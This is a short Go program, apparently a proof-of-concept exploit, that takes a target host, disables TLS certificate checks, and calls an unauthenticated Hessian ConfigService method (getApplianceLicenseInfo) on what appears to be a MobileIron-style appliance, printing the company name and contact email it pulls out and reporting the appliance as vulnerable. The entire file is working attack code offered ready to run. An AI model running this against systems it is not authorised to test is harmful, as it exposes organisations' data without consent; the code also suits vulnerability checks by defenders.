package main

import (
	"crypto/tls"
	"fmt"
	"github.com/ggwhite/go-hessian"
	"log"

	"net/http"
	"os"
	"reflect"
)

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	finalUrl := fmt.Sprintf("https://%s/mics/services/ConfigService", os.Args[1])
	proxy, err := hessian.NewProxy(&hessian.ProxyConfig{
		Version: hessian.V1,
		URL:     finalUrl,
		Client:  http.DefaultClient,
	})
	if err != nil {
		panic("Exploit failed")
	}
	err = proxy.RegisterType(reflect.TypeOf(LicenseSettingsConfDTO{}))
	if err != nil {
		panic("Exploit failed")
	}
	args, err := proxy.Invoke("getApplianceLicenseInfo")
	if err != nil {
		panic("Exploit failed")
	}
	if len(args) != 1 {
		panic("Exploit failed")
	}
	if licenseInfo, isLicenseInfo := args[0].(LicenseSettingsConfDTO); isLicenseInfo {
		log.Println("Information extracted, appliance is vulnerable:")
		log.Printf("Company: %s , contact: %s", licenseInfo.CompanyName, licenseInfo.ContactEmail)
	}
}

type LicenseSettingsConfDTO struct {
	hessian.Package `hessian:"com.mi.mics.dto.LicenseSettingsConfDTO"`
	CompanyName     string `hessian:"companyName"`
	ContactEmail    string `hessian:"contactEmail"`
}
